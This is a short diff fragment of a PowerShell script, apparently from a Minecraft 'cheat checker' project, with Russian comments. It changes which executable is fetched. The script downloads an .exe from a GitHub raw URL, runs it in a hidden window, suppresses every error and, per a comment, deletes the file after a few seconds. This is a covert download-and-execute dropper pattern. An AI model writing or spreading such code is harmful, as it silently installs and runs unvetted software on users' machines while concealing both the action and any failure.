@@ -91,10 +91,10 @@ try {
     Start-Sleep 1
     
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/MinecraftCheatChecker.exe" -OutFile "MinecraftCheatChecker.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/CheatCheckModules.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "MinecraftCheatChecker.exe" -WindowStyle Hidden
+    Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden
     
     # Удаляем файл через 5 секунды
     
@@ -102,5 +102,6 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
